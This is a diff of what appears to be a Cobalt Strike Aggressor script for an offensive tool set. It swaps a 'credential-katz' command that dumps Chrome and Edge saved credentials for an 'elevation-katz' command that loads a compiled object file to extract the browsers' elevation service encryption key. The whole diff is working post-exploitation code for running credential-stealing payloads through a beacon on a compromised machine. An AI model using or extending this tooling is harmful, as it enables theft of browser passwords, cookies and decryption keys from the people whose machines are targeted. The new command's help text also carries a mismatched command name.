@@ -13,16 +13,11 @@ beacon_command_register(
 );
 
 beacon_command_register(
-   "credential-katz",
-   "Dump credential manager from Chrome or Edge",
-   "Dump credential manager from Chrome or Edge\n\nUse: credential-katz [chrome|edge] [pid]"
+   "elevation-katz",
+   "Dump elevation service encryption key",
+   "Dump elevation service encryption key\n\nUse: cookie-katz [chrome|edge] [terminate] [useHW] [useTL32] [wait] [executable_path] [module_name]"
 );
 
-beacon_command_register(
-   "credential-katz-find",
-   "Find processes for credential-katz",
-   "Find processes for credential-katz\n\nUse: credential-katz-find [chrome|edge]"
-);
 
 alias cookie-katz {
     local('$bid $browser $pid $pidStr $handle $data $args $path');
@@ -100,64 +95,10 @@ alias cookie-katz-find {
     beacon_inline_execute($1, $data, "go", $args);
 }
 
-
-beacon_command_register(
-   "credential-katz",
-   "Dump credential manager from Chrome or Edge",
-   "Dump credential manager from Chrome or Edge\n\nUse: credential-katz [chrome|edge] [pid]"
-);
-
-beacon_command_register(
-   "credential-katz-find",
-   "Find processes for credential-katz",
-   "Find processes for credential-katz\n\nUse: credential-katz-find [chrome|edge]"
-);
-
-alias credential-katz {
-    local('$bid $browser $pid $pidStr $handle $data $args $path');
-    if (size(@_) != 3) {
-        berror($1, "Use: [chrome|edge] [pid]");
-        return;
-    }
-    else if (barch($1) eq "x86") {
-        berror($1, "Not a x64 beacon!");
-        return;
-    }
-
-    # Check arguments
-    ($bid, $browser, $pidStr) = @_;
-    if ($browser !in @("chrome", "edge")) {
-        berror($1, "Unsupported browser: '$browser $+ '");
-        return;
-    }
-
-    $pid = [Integer parseInt: $pidStr];
-    if ($pid is $null) {
-        berror($1, "Could not parse pid '$pidStr $+ '");
-        return;
-    }
-
-    # Read the BOF
-    $path = getFileProper(script_resource(""), "release", "CredentialKatzBOF.x64.o");
-    if (!-isFile $path) {
-        berror($1, "$path does not exist");
-        return;
-    }
-    $handle = openf($path);
-    $data = readb($handle, -1);
-    closef($handle);
-
-    # Pack our arguments
-    $args   = bof_pack($1, "zi", "/$browser", $pid);
-
-    # Execute it
-    beacon_inline_execute($1, $data, "go", $args);
-}
-
-alias credential-katz-find {
-    local('$bid $browser $handle $data $args $path');
-    if (size(@_) != 2) {
-        berror($1, "Use: [chrome|edge]");
+alias elevation-katz {
+    local('$bid $browser $terminate $terminateStr $useHW $useHWStr $useTL32 $useTL32Str $wait $waitStr $executable $module $handle $data $args $path');
+    if (size(@_) != 8) {
+        berror($1, "Use: [chrome|edge] [terminate] [useHW] [useTL32] [wait] [executable_path] [module_name]");
         return;
     }
     else if (barch($1) eq "x86") {
@@ -172,8 +113,32 @@ alias credential-katz-find {
         return;
     }
 
+    $terminate = [Integer parseInt: $terminateStr];
+    if ($terminate is $null) {
+        berror($1, "Could not parse terminate '$terminateStr $+ '");
+        return;
+    }
+
+    $useHW = [Integer parseInt: $useHWStr];
+    if ($useHW is $null) {
+        berror($1, "Could not parse useHW '$useHWStr $+ '");
+        return;
+    }
+
+    $useTL32 = [Integer parseInt: $useTL32Str];
+    if ($useTL32 is $null) {
+        berror($1, "Could not parse useTL32 '$useTL32Str $+ '");
+        return;
+    }
+
+    $wait = [Integer parseInt: $waitStr];
+    if ($wait is $null) {
+        berror($1, "Could not parse wait '$waitStr $+ '");
+        return;
+    }
+
     # Read the BOF
-    $path = getFileProper(script_resource(""), "release", "ListChromeProcessCredential.x64.o");
+    $path = getFileProper(script_resource(""), "release", "ElevationKatzBOF.x64.o");
     if (!-isFile $path) {
         berror($1, "$path does not exist");
         return;
@@ -183,7 +148,9 @@ alias credential-katz-find {
     closef($handle);
 
     # Pack our arguments
-    $args   = bof_pack($1, "z", "/$browser");
+    # browser, teminate, useHW, useTL32, wait, executable, module
+    # const char*, short, short, short, int, const wchar_t*, const wchar_t*
+    $args   = bof_pack($1, "zsssiZZ", "/$browser", $terminate, $useHW, $useTL32, $wait, "/$executable", "/$module");
 
     # Execute it
     beacon_inline_execute($1, $data, "go", $args);
